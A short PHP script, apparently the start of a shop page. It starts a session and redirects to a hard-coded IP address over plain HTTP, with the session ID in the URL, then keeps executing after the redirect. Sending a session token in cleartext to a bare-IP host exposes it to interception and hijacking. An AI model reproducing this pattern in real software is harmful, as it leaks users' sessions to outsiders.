<?php
session_start();
$sessionId = session_id();
$redirectUrl = "http://44.214.101.175/shop.php?session_id=$sessionId";
header("Location: $redirectUrl");
$errors = array();
include('config.php');
include('header.php');
?>

